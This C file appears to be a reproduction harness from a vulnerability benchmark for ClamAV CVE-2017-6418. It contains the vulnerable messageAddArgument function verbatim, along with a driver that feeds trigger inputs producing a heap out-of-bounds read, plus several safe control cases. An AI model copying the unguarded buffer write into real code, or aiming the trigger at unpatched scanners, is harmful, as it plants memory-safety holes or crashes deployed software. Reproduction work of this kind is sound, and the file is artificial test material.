/* cve_barebone harness -- clamav CVE-2017-6418 / messageAddArgument heap-buffer-overflow READ
 * (CWE-125), libclamav/message.c.
 *
 * messageAddArgument() decodes `arg` via rfc2231() into a fresh cli_strdup() buffer `p`. When
 * p is byte-for-byte "filename" (9-byte allocation: 8 chars + NUL), the unguarded
 * `p[8] = '='` overwrites that buffer's ONLY terminator -- in-bounds as a WRITE, but leaving
 * m->mimeArguments[offset] a 9-byte "filename=" chunk with no NUL anywhere inside it. The very
 * next messageAddArgument() call's own dedup loop does
 * `strcasecmp(arg, m->mimeArguments[offset])` -- unbounded -- against that corrupted buffer;
 * if `arg` matches "filename=" case-insensitively for 9 bytes, the compare walks off the end of
 * the 9-byte allocation -> ASAN heap-buffer-overflow READ, crash stack rooted directly inside
 * messageAddArgument's own for-loop.
 *
 * TRIGGER: call #1 = "filename" (exact, arms the corruption); call #2 = a case-scrambled
 *          "filename=" prefix (+ arbitrary suffix) -> OOB read inside call #2.
 * SAFE:    every other shape -- a single well-formed add, an unwanted/whitespace-only arg, the
 *          "filename" write with no follow-up read, a properly '='-terminated "filename=..."
 *          pair (strchr() skips the corruption if-block outright), corruption armed but the
 *          follow-up compare diverges within the valid 9 bytes, ordinary multi-argument growth
 *          + dedup over well-formed strings, and the RFC2231-encoded/high-bit-byte forms that
 *          exercise rfc2231()'s other branches (its own inserted '=' keeps strchr() non-NULL).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <ctype.h>
#include <assert.h>
#include <stdarg.h>

/* ---- real mime_type enum (libclamav/mbox.h, verbatim -- NOMIME must stay 0: a freshly
 * calloc()'d message starts with mimeType==NOMIME, matching messageCreate()/messageReset()). ---- */
typedef enum {
	NOMIME, APPLICATION, AUDIO, IMAGE, MESSAGE, MULTIPART, TEXT, VIDEO, MEXTENSION
} mime_type;

/* ---- minimal `message` struct: the REAL field names/types messageAddArgument (and the
 * incidental messageGetMimeType/messageSetMimeType stubs below) touch, trimmed of the ~15
 * unrelated fields (body_first/ctx/bounce/binhex/yenc/isInfected/jobj/...) that pull in the
 * whole libclamav scanning-engine type graph (cli_ctx, text, json_object) and are never read or
 * written by messageAddArgument's own body. (libclamav/message.h) ---- */
typedef struct message {
	mime_type mimeType;
	char **mimeArguments;
	int numberOfArguments;
} message;

/* ---- CLI_MAX_ALLOCATION (libclamav/others.h, verbatim value). ---- */
#define CLI_MAX_ALLOCATION (182*1024*1024)

/* ---- cli_errmsg: minimal faithful stub (real one adds thread-safe mprintf-style logging
 * plumbing; incidental -- only reached on OOM, which cannot happen for our tiny allocations). ---- */
void cli_errmsg(const char *str, ...)
{
	va_list ap;
	va_start(ap, str);
	vfprintf(stderr, str, ap);
	va_end(ap);
}
/* cli_dbgmsg: the real thing is `#define cli_dbgmsg (!UNLIKELY(cli_debug_flag)) ? (void)0 :
 * cli_dbgmsg_internal` (others.h) -- a no-op unless debug logging is explicitly enabled
 * (cli_debug_flag defaults to 0, others_common.c), which it never is here. */
#define cli_dbgmsg(...) ((void)0)

/* ---- cli_malloc / cli_realloc / cli_strdup: real callees on the corruption's construction path
 * (rfc2231() / messageAddArgument's own cli_realloc of mimeArguments), copied VERBATIM from
 * libclamav/others_common.c. ---- */
void *cli_malloc(size_t size)
{
	void *alloc;


    if(!size || size > CLI_MAX_ALLOCATION) {
	cli_errmsg("cli_malloc(): Attempt to allocate %lu bytes. Please report to http://bugs.clamav.net\n", (unsigned long int) size);
	return NULL;
    }

    alloc = malloc(size);

    if(!alloc) {
	perror("malloc_problem");
	cli_errmsg("cli_malloc(): Can't allocate memory (%lu bytes).\n", (unsigned long int) size);
	return NULL;
    } else return alloc;
}

void *cli_realloc(void *ptr, size_t size)
{
	void *alloc;


    if(!size || size > CLI_MAX_ALLOCATION) {
	cli_errmsg("cli_realloc(): Attempt to allocate %lu bytes. Please report to http://bugs.clamav.net\n", (unsigned long int) size);
	return NULL;
    }

    alloc = realloc(ptr, size);

    if(!alloc) {
	perror("realloc_problem");
	cli_errmsg("cli_realloc(): Can't re-allocate memory to %lu bytes.\n", (unsigned long int) size);
	return NULL;
    } else return alloc;
}

char *cli_strdup(const char *s)
{
        char *alloc;


    if(s == NULL) {
        cli_errmsg("cli_strdup(): s == NULL. Please report to http://bugs.clamav.net\n");
        return NULL;
    }

    alloc = strdup(s);

    if(!alloc) {
        perror("strdup_problem");
        cli_errmsg("cli_strdup(): Can't allocate memory (%u bytes).\n", (unsigned int) strlen(s));
        return NULL;
    }

    return alloc;
}

/* ---- messageGetMimeType / messageSetMimeType: minimal faithful stubs. Both are INCIDENTAL --
 * only reached by the harmless first ("filename" alone) call; the crashing second call dies at
 * the strcasecmp() in the offset-loop before ever reaching them. The real messageSetMimeType
 * hashes `type` through a static table_t built from mime_map (table.c); every call this harness
 * makes passes type=="application", for which the real function's OWN first lookup (tableFind on
 * the literal "application" entry of mime_map) already resolves to APPLICATION on the very first
 * branch -- reproduced directly instead of dragging in table.c. ---- */
mime_type messageGetMimeType(const message *m)
{
	assert(m != NULL);
	return m->mimeType;
}

int messageSetMimeType(message *mess, const char *type)
{
	assert(mess != NULL);
	if(type == NULL)
		return 0;
	if(strcasecmp(type, "application") == 0) {
		mess->mimeType = APPLICATION;
		return 1;
	}
	return 0;
}

/* ---- hex: real callee of rfc2231()'s '%'-escape branch (libclamav/message.c, verbatim). ---- */
static unsigned char
hex(char c)
{
	if(isdigit(c))
		return c - '0';
	if((c >= 'A') && (c <= 'F'))
		return c - 'A' + 10;
	if((c >= 'a') && (c <= 'f'))
		return c - 'a' + 10;
	cli_dbgmsg("Illegal hex character '%c'\n", c);

	/*
	 * Some mails (notably some spam) break RFC2045 by failing to encode
	 * the '=' character
	 */
	return '=';
}

/* ---- usefulArg: real callee, gates which arguments messageAddArgument keeps
 * (libclamav/message.c, verbatim). ---- */
static int
usefulArg(const char *arg)
{
	if((strncasecmp(arg, "name", 4) != 0) &&
	   (strncasecmp(arg, "filename", 8) != 0) &&
	   (strncasecmp(arg, "boundary", 8) != 0) &&
	   (strncasecmp(arg, "protocol", 8) != 0) &&
	   (strncasecmp(arg, "id", 2) != 0) &&
	   (strncasecmp(arg, "number", 6) != 0) &&
	   (strncasecmp(arg, "total", 5) != 0) &&
	   (strncasecmp(arg, "type", 4) != 0)) {
		cli_dbgmsg("Discarding unwanted argument '%s'\n", arg);
		return 0;
	}
	return 1;
}

/* ---- rfc2231: real callee, produces the exact 9-byte "filename\0" heap buffer the bug
 * corrupts (libclamav/message.c, verbatim). ---- */
static char *
rfc2231(const char *in)
{
	const char *ptr;
	char *ret, *out;
	enum { LANGUAGE, CHARSET, CONTENTS } field;

	if(strstr(in, "*0*=") != NULL) {
		char *p;

		/* Don't handle continuations, decode what we can */
		p = ret = cli_malloc(strlen(in) + 16);
		if(ret == NULL) {
            cli_errmsg("rfc2331: out of memory, unable to proceed\n");
			return NULL;
        }

		do {
			switch(*in) {
				default:
					*p++ = *in++;
					continue;
				case '*':
					do
						in++;
					while((*in != '*') && *in);
					if(*in) {
						in++;
						continue;
					}
					*p = '\0';
					break;
				case '=':
					/*strcpy(p, in);*/
					strcpy(p, "=rfc2231failure");
					break;
			}
			break;
		} while(*in);

		cli_dbgmsg("RFC2231 parameter continuations are not yet handled, returning \"%s\"\n",
			ret);
		return ret;
	}

	ptr = strstr(in, "*0=");
	if(ptr != NULL)
		/*
		 * Parameter continuation, with no continuation
		 * Thunderbird 1.5 (and possibly other versions) does this
		 */
		field = CONTENTS;
	else {
		ptr = strstr(in, "*=");
		field = LANGUAGE;
	}

	if(ptr == NULL) {	/* quick return */
		out = ret = cli_strdup(in);
		while(*out)
			*out++ &= 0x7F;
		return ret;
	}

	cli_dbgmsg("rfc2231 '%s'\n", in);

	ret = cli_malloc(strlen(in) + 1);

	if(ret == NULL) {
        cli_errmsg("rfc2331: out of memory for ret\n");
		return NULL;
    }

	/*
	 * memcpy(out, in, (ptr - in));
	 * out = &out[ptr - in];
	 * in = ptr;
	 */
	out = ret;
	while(in != ptr)
		*out++ = *in++;

	*out++ = '=';

	while(*ptr++ != '=')
		;

	/*
	 * We don't do anything with the language and character set, just skip
	 * over them!
	 */
	while(*ptr) {
		switch(field) {
			case LANGUAGE:
				if(*ptr == '\'')
					field = CHARSET;
				break;
			case CHARSET:
				if(*ptr == '\'')
					field = CONTENTS;
				break;
			case CONTENTS:
				if(*ptr == '%') {
					unsigned char byte;

					if((*++ptr == '\0') || (*ptr == '\n'))
						break;

					byte = hex(*ptr);

					if((*++ptr == '\0') || (*ptr == '\n')) {
						*out++ = byte;
						break;
					}

					byte <<= 4;
					byte += hex(*ptr);
					*out++ = byte;
				} else
					*out++ = *ptr;
		}
		if(*ptr++ == '\0')
			/*
			 * Incorrect message that has just one character after
			 * a '%'.
			 * FIXME: stash something in out that would, for example
			 *	treat %2 as %02, assuming field == CONTENTS
			 */
			break;
	}

	if(field != CONTENTS) {
		free(ret);
		cli_dbgmsg("Invalid RFC2231 header: '%s'\n", in);
		return cli_strdup("");
	}

	*out = '\0';

	cli_dbgmsg("rfc2231 returns '%s'\n", ret);

	return ret;
}

/* ================= TARGET (VERBATIM, byte-for-byte original_function.c) =================
 * noinline so the crash (raised from inside the strcasecmp() call in its own for-loop) keeps
 * its own stack frame -- dc_batch requires the target function name in the ASAN backtrace. */
__attribute__((noinline))
void
messageAddArgument(message *m, const char *arg)
{
	int offset;
	char *p;

	assert(m != NULL);

	if(arg == NULL)
		return;	/* Note: this is not an error condition */

	while(isspace(*arg))
		arg++;

	if(*arg == '\0')
		/* Empty argument? Probably a broken mail client... */
		return;

	cli_dbgmsg("messageAddArgument, arg='%s'\n", arg);

	if(!usefulArg(arg))
		return;

	for(offset = 0; offset < m->numberOfArguments; offset++)
		if(m->mimeArguments[offset] == NULL)
			break;
		else if(strcasecmp(arg, m->mimeArguments[offset]) == 0)
			return;	/* already in there */

	if(offset == m->numberOfArguments) {
		char **q;

		m->numberOfArguments++;
		q = (char **)cli_realloc(m->mimeArguments, m->numberOfArguments * sizeof(char *));
		if(q == NULL) {
			m->numberOfArguments--;
			return;
		}
		m->mimeArguments = q;
	}

	p = m->mimeArguments[offset] = rfc2231(arg);
	if(!p) {
		/* problem inside rfc2231() */
		cli_dbgmsg("messageAddArgument, error from rfc2231()\n");
		return;
	}

	if(strchr(p, '=') == NULL) {
		if(strncmp(p, "filename", 8) == 0) {
			/*
			 * FIXME: Bounce message handling is corrupting the in
			 * core copies of headers
			 */
			cli_dbgmsg("Possible data corruption fixed\n");
			p[8] = '=';
		} else {
			if(*p)
				cli_dbgmsg("messageAddArgument, '%s' contains no '='\n", p);
			free(m->mimeArguments[offset]);
			m->mimeArguments[offset] = NULL;
			return;
		}
	}

	/*
	 * This is terribly broken from an RFC point of view but is useful
	 * for catching viruses which have a filename but no type of
	 * mime. By pretending defaulting to an application rather than
	 * to nomime we can ensure they're saved and scanned
	 */
	if((strncasecmp(p, "filename=", 9) == 0) || (strncasecmp(p, "name=", 5) == 0))
		if(messageGetMimeType(m) == NOMIME) {
			cli_dbgmsg("Force mime encoding to application\n");
			messageSetMimeType(m, "application");
		}
}

/* ================= driver ================= */
static char *heap_str(const unsigned char *bytes, size_t n)
{
	char *s = (char *)malloc(n + 1);
	if (!s) { fprintf(stderr, "oom\n"); exit(2); }
	if (n) memcpy(s, bytes, n);
	s[n] = '\0';
	return s;
}

int main(int argc, char **argv)
{
	if (argc < 2) { fprintf(stderr, "usage: %s <input>\n", argv[0]); return 2; }

	FILE *fp = fopen(argv[1], "rb");
	if (!fp) { perror("fopen"); return 2; }
	fseek(fp, 0, SEEK_END);
	long ln = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	if (ln < 0) ln = 0;
	size_t n = (size_t)ln;

	unsigned char *data = (unsigned char *)malloc(n + 1);   /* HEAP input, ASAN-guarded */
	if (!data) { fclose(fp); return 2; }
	size_t got = fread(data, 1, n, fp);
	fclose(fp);
	data[got] = '\0';

	unsigned char mode = (got > 0) ? data[0] : 0;
	unsigned char *tail = (got > 1) ? (data + 1) : data;
	size_t tail_len = (got > 1) ? (got - 1) : 0;
#define TB(i) (tail_len ? tail[(size_t)(i) % tail_len] : 0)

	void (* volatile addarg)(message *, const char *) = messageAddArgument;
	message *m = (message *)calloc(1, sizeof(message));  /* numberOfArguments=0, mimeArguments=NULL, mimeType=NOMIME(0) */
	if (!m) { free(data); return 2; }

	int trigger = ((mode & 1) == 0);

	if (trigger) {
		/* ---- Call 1: EXACTLY "filename" (only leading whitespace -- which
		 * messageAddArgument itself skips before ever calling rfc2231() -- varies) ->
		 * rfc2231()'s quick-return path cli_strdup()s a 9-byte "filename\0" buffer;
		 * strncmp(p,"filename",8)==0 && strlen(p)==8, so the unguarded `p[8]='='` (the
		 * CVE-2017-6418 line) overwrites that buffer's only NUL, leaving
		 * m->mimeArguments[0] a 9-byte "filename=" chunk with no terminator at all. ---- */
		size_t ws_n = TB(0) % 4;
		unsigned char wsch = (TB(1) & 1) ? (unsigned char)'\t' : (unsigned char)' ';
		unsigned char buf1[3 + 8];
		size_t p1 = 0;
		for (size_t i = 0; i < ws_n; i++) buf1[p1++] = wsch;
		memcpy(buf1 + p1, "filename", 8); p1 += 8;
		char *arg1 = heap_str(buf1, p1);
		addarg(m, arg1);
		free(arg1);

		/* ---- Call 2: a case-scrambled "filename=" prefix (+ attacker-controlled suffix)
		 * -> the offset-loop's `strcasecmp(arg, m->mimeArguments[0])` walks all 9
		 * in-bounds bytes of the corrupted buffer without a mismatch or a NUL to stop on,
		 * then reads byte 9 of a 9-byte allocation -> ASAN heap-buffer-overflow READ,
		 * still inside messageAddArgument. ---- */
		static const char PROTO[9] = "filename=";
		unsigned char buf2[9 + 64];
		size_t p2 = 0;
		for (size_t i = 0; i < 9; i++) {
			unsigned char c = (unsigned char)PROTO[i];
			int upper = (TB(i + 2) >> (i % 5)) & 1;
			buf2[p2++] = upper ? (unsigned char)toupper(c) : (unsigned char)tolower(c);
		}
		size_t suf_n = TB(11) % 48;
		for (size_t i = 0; i < suf_n; i++) {
			unsigned char b = TB(i + 12);
			if (b == 0) b = (unsigned char)'x';
			buf2[p2++] = b;
		}
		char *arg2 = heap_str(buf2, p2);
		addarg(m, arg2);            /* <-- OOB read happens inside this call, on TRIGGER inputs */
		free(arg2);
	} else {
		int scen = (mode >> 1) % 8;
		switch (scen) {
		case 0: { /* well-formed useful arg -> normal add, no crash */
			static const char *KEYS[] = {
				"type=text/plain", "name=readme.txt", "boundary=----X",
				"id=<1>", "number=1", "total=2", "protocol=xyz"
			};
			const char *k = KEYS[TB(0) % 7];
			unsigned char buf[96];
			size_t kl = strlen(k);
			memcpy(buf, k, kl);
			size_t p = kl;
			size_t extra = TB(1) % 16;
			for (size_t i = 0; i < extra; i++) {
				unsigned char b = TB(i + 2);
				if (b == 0) b = (unsigned char)'a';
				buf[p++] = b;
			}
			char *arg = heap_str(buf, p);
			addarg(m, arg); free(arg);
			break;
		}
		case 1: { /* not useful -> usefulArg() discards it before any dedup/rfc2231 work */
			unsigned char buf[64];
			memcpy(buf, "random=", 7);
			size_t p = 7;
			size_t extra = TB(0) % 24;
			for (size_t i = 0; i < extra; i++) {
				unsigned char b = TB(i + 1);
				if (b == 0) b = (unsigned char)'q';
				buf[p++] = b;
			}
			char *arg = heap_str(buf, p);
			addarg(m, arg); free(arg);
			break;
		}
		case 2: { /* all-whitespace -> empty after the leading-isspace trim, early return */
			unsigned char buf[8];
			size_t wn = 1 + TB(0) % 6;
			size_t p = 0;
			for (size_t i = 0; i < wn; i++)
				buf[p++] = (TB(i + 1) & 1) ? (unsigned char)'\t' : (unsigned char)' ';
			char *arg = heap_str(buf, p);
			addarg(m, arg); free(arg);
			break;
		}
		case 3: { /* "filename" alone, single call: hits the buggy p[8]='=' write once, but
			   * NOTHING reads mimeArguments[0] again afterwards -> exits clean. */
			char *arg = heap_str((const unsigned char *)"filename", 8);
			addarg(m, arg); free(arg);
			break;
		}
		case 4: { /* two calls, first ALREADY contains '=' -> strchr() short-circuits the
			   * corruption if-block entirely; second call's compare is against a
			   * properly terminated string despite sharing the "filename=" prefix. */
			unsigned char b1[64];
			memcpy(b1, "filename=", 9);
			size_t p1 = 9;
			size_t e1 = TB(0) % 20;
			for (size_t i = 0; i < e1; i++) {
				unsigned char b = TB(i + 1);
				if (b == 0) b = (unsigned char)'v';
				b1[p1++] = b;
			}
			char *arg1 = heap_str(b1, p1);
			addarg(m, arg1); free(arg1);

			unsigned char b2[64];
			memcpy(b2, "filename=", 9);
			size_t p2 = 9;
			size_t e2 = TB(10) % 20;
			for (size_t i = 0; i < e2; i++) {
				unsigned char b = TB(i + 11);
				if (b == 0) b = (unsigned char)'w';
				b2[p2++] = b;
			}
			char *arg2 = heap_str(b2, p2);
			addarg(m, arg2); free(arg2);
			break;
		}
		case 5: { /* two calls: first arms the corruption ("filename" alone), second uses
			   * a DIFFERENT useful prefix -> strcasecmp mismatches within the valid 9
			   * bytes, well before the redzone. */
			char *arg1 = heap_str((const unsigned char *)"filename", 8);
			addarg(m, arg1); free(arg1);

			static const char *OTH[] = {
				"name=", "type=", "boundary=", "id=", "number=", "total=", "protocol="
			};
			const char *k = OTH[TB(0) % 7];
			unsigned char b2[64];
			size_t kl = strlen(k);
			memcpy(b2, k, kl);
			size_t p2 = kl;
			size_t e2 = TB(1) % 20;
			for (size_t i = 0; i < e2; i++) {
				unsigned char b = TB(i + 2);
				if (b == 0) b = (unsigned char)'z';
				b2[p2++] = b;
			}
			char *arg2 = heap_str(b2, p2);
			addarg(m, arg2); free(arg2);
			break;
		}
		case 6: { /* several well-formed useful args -> array growth + duplicate detection
			   * over properly terminated strings, plus a deliberate verbatim repeat. */
			static const char *KEYS[] = {
				"name=a.txt", "type=text/plain", "boundary=--X--",
				"id=<z>", "number=3", "total=5"
			};
			for (int i = 0; i < 4; i++) {
				const char *k = KEYS[(TB(i) + (unsigned)i) % 6];
				char *arg = heap_str((const unsigned char *)k, strlen(k));
				addarg(m, arg); free(arg);
			}
			const char *k0 = KEYS[TB(0) % 6];
			char *dup = heap_str((const unsigned char *)k0, strlen(k0));
			addarg(m, dup); free(dup);
			break;
		}
		default: { /* case 7: RFC2231-encoded forms -> exercise rfc2231()'s LANGUAGE/
			    * CHARSET/CONTENTS + '%'-hex-decode + high-bit-masking branches; the
			    * literal '=' rfc2231 itself inserts keeps strchr(p,'=') non-NULL, so
			    * the corruption if-block is skipped regardless of prefix. */
			static const char *ENC[] = {
				"filename*0*=", "filename*=utf-8''report%2Etxt",
				"filename*0=chunk", "type*=us-ascii''text%2Fplain",
			};
			const char *k = ENC[TB(0) % 4];
			unsigned char buf[96];
			size_t kl = strlen(k);
			memcpy(buf, k, kl);
			size_t p = kl;
			size_t extra = TB(1) % 16;
			for (size_t i = 0; i < extra; i++)
				buf[p++] = TB(i + 2) | 0x80;  /* high-bit bytes, never NUL */
			char *arg = heap_str(buf, p);
			addarg(m, arg); free(arg);
			break;
		}
		}
	}

	free(m->mimeArguments);   /* free() only needs the pointer -- safe even though some slots
	                            * may be the corrupted/unterminated 9-byte buffer; leak
	                            * checking is off (ASAN_OPTIONS detect_leaks=0) so the
	                            * individual mimeArguments[i] strings are not walked/freed. */
	free(m);
	free(data);
	return 0;
}
